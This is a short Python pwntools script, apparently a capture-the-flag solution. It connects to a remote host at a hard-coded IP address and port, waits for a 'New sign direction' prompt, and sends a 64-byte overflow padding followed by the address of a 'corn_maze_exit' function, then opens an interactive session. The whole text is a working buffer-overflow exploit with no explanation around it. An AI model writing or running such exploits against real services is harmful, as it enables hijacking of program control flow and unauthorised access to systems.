from pwn import *
HOST="18.226.103.146"
PORT=1337
elf=ELF("./main")
r=remote(HOST,PORT)
r.recvuntil(b"New sign direction: ")
payload=b"A"*64+p64(elf.symbols['corn_maze_exit'])
r.sendline(payload)
r.interactive()
